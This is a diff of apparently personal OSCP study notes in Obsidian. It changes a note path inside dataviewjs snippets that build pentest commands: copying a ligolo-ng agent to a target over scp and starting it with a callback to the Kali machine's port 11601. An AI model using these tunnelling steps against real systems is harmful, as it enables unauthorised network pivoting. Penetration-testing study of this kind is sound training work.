@@ -40,7 +40,7 @@ $env:PROCESSOR_ARCHITECTURE
 
 Example using SCP:
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
 const command = `scp agent ubuntu@${ip}:~/[filename]`;
 
@@ -117,7 +117,7 @@ rm ligolo-ng.yaml
 
 ## 🔹 Step 5 — Start Agent (Target)
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `./agent.exe -connect ${KaliIP}:11601 -ignore-cert`;
 
